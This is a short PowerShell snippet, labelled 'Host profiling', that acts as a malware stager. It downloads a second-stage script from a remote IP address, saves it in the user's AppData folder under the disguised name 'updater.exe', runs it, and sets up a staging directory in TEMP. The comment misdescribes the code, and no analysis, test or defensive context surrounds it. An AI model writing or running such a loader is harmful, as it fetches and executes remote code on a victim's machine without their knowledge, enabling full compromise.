
<# Host profiling #> $TargetUrl = "https://192.0.2.195/stage2.ps1"; $WorkingPath = "$env:APPDATA\updater.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath $WorkingPath; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Set-Location -Path $env:TEMP
